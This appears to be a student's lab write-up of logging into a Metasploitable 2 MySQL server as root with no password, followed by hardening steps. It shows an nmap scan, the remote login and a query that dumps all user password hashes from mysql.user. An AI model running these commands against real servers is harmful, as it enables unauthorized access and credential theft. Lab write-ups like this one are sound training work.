# 09 — MySQL No-Password Root Access

## Environment
- Attacker: Kali Linux 192.168.56.102
- Target: Metasploitable 2 192.168.56.101
- Date: 18 May 2026
- Port: 3306

## Overview
Logged into MySQL on Metasploitable as root with no password. 
No exploit was needed — the root account had no password set 
and port 3306 was exposed directly to the network.

## Tools
nmap, mysql client

## Commands

```bash
nmap -p 3306 --script mysql-info 192.168.56.101

mysql -u root -h 192.168.56.101 --skip-ssl

show databases;
select user, password from mysql.user;
```

## Output

```text
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, ConnectWithDatabase,
|   SupportsTransactions, SupportsCompression
|_  Salt: _e^)L$my<Z1%dI~dVbjn

Welcome to the MariaDB monitor.
Your MySQL connection id is 11
Server version: 5.0.51a-3ubuntu5 (Ubuntu)
```

## Findings
MySQL 5.0 was confirmed running — an outdated and 
misconfigured version. The root account had no password 
set, giving instant full access to every database on the 
server. All user password hashes were dumped from the 
mysql database.

## Defense Applied

Set a root password:

```bash
mysqladmin -u root password 'StrongP@ssword123'
```

Restricted remote access by editing `/etc/mysql/my.cnf`:

```text
bind-address = 127.0.0.1
```

Restarted MySQL. Remote connection from Kali was refused.

## What I Learned
Databases should never be exposed directly to a network. 
A root account with no password gives an attacker complete 
access to all stored data instantly. The bind-address 
setting is one of the most important MySQL hardening steps 
— it restricts connections to localhost only.
